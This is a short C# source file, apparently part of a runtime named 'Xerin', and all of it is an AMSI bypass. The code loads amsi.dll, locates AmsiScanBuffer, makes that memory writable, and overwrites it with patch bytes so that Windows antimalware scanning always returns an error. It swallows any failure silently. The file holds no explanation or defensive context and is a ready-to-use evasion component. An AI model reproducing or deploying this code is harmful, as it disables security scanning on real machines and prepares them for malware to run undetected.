using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Xerin.Runtime
{
	public static class AMSI
	{
		private static List<byte> GetPatch()
		{
			if (IntPtr.Size == 8)
			{
				return new List<byte> { 184, 87, 0, 7, 128, 195 };
			}
			return new List<byte> { 184, 87, 0, 7, 128, 194, 24, 0 };
		}

		[DllImport("kernel32")]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32")]
		private static extern IntPtr LoadLibrary(string name);

		[DllImport("kernel32")]
		private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		private static void BypassAmsi()
		{
			try
			{
				IntPtr hModule = LoadLibrary("amsi.dll");
				IntPtr procAddress = GetProcAddress(hModule, "AmsiScanBuffer");
				byte[] array = GetPatch().ToArray();
				uint lpflOldProtect;
				VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, 64u, out lpflOldProtect);
				Marshal.Copy(array, 0, procAddress, array.Length);
				uint lpflOldProtect2;
				VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out lpflOldProtect2);
			}
			catch
			{
			}
		}
	}
}
